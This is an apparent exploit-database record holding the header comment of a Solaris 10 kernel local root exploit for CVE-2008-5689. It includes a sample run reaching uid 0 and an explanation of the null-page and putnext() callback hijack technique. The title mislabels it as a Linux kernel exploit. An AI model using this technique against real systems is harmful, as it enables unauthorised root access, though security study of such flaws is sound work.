{
    "text": "ecve : CVE-2008-5689 ， title : Linux Kernel ( Solaris 10 / < 5.10 138888-01 ) - Local Privilege Escalation - Solaris local Exploit ， verified : Not Verified ， exploit_detail : / ，  * hoagie_solaris_siocgtunparam.c ，  * LOCAL SOLARIS KERNEL ROOT EXPLOIT ( < 5.10 138888-01 ) - CVE-2008-568 ，  * Bug reported by Tobias Klein ，  * Exploit by : peri.carding (  ，  *  $ ./hoagie_solaris_siocgtunparam ，  * hoagie_solaris_siocgtunparam.c - solaris root < < 5.10 138888-01 local ，  * -andi / void.at ，  *  [  *  ] socket created ，  *  [  *  ] mapping zero page successful ，  *  [  *  ] process cred address : 0xd3853894 ，  *  [  *  ] prepare null page ，  *  [  *  ] clean up write queue ，  *  # uname -a ，  * SunOS unknown 5.10 Generic_118844-26 i86pc i386 i86pc ，  *  # id ，  * uid=0 ( root ) gid=0 ( root )  ，  *  #  ，  * First of all we have to make sure that ip_extract_tunreq (  ) will ，  * return 0 and ipifp is still set to NULL. This can be achieved by ，  * using an interface alias starting with zero. ( the interface ip.tun0 ，  * must not exist because ipif_lookup_on_name (  ) will \"fail\" to get ，  * null page )  ，  * ip_if.c / ipif_lookup_on_name (  )  ，  * ... ，  * if ( &cp [ 2 ] < endp cp [ 1 ] == '0' )  ，  * return ( NULL )  ;  ，  * ... ，  * In ip_sioctl_tunparam (  ) ipif->ipif_ill is used for mutex enter ，  * so we have to set the offet for an ill_t structure. Later putnext (  )  ，  * will be called with a queue ( see ill_t ) . We can use this queue to ，  * add a custom callback function that is used by putnext (  ) . ，  * ip_if.c / ip_sioctl_tunparam (  )  :  ，  * ... ，  * ill = ipif->ipif_ill ;  ，  * mutex_enter ( &connp->conn_lock )  ;  ，  * mutex_enter ( &ill->ill_lock )  ;  ，  * ... ，  * if ( success ) { ，  * ip1dbg (  ( \"sending down tunparam request \" )  )  ;  ，  * putnext ( ill->ill_wq , mp1 )  ;  ，  * return ( EINPROGRESS )  ;  ，  * ... ，  * putnext.c / putnext (  )  :  ，  * ... ，  * mutex_exit ( QLOCK ( qp )  )  ;  ，  * STR_FTEVENT_MSG ( mp , fqp , FTEV_PUTNEXT , mp->b_rptr - ，  * mp->b_datap->db_base )  ;  ，  *  (  * putproc )  ( qp , mp )  ;  ，  * ... ，  * ill_wq can't be modified from kernel space because its allocated ，  * in userland -> so we cannot modify the ill_wq queue in kernel ，  * code. thereforce a signal handler will clean the queue in userland. ，  * Affected Software : Solaris 10 without patch 138888-01 ( SPARC )  ，  * Solaris 10 without patch 138889-01 ( x86 )  ，  * OpenSolaris < snv_77 ( SPARC )  ，  * OpenSolaris < snv_77 ( x86 )  ，  * THIS FILE IS FOR STUDYING PURPOSES ONLY AND A PROOF-OF- ，  * CONCEPT. THE AUTHOR CAN NOT BE HELD RESPONSIBLE FOR ANY ，  * DAMAGE DONE USING THIS PROGRAM. ，  * VOID.AT Security ，  * andi @ void.at",
    "time": "2011-01-10"
}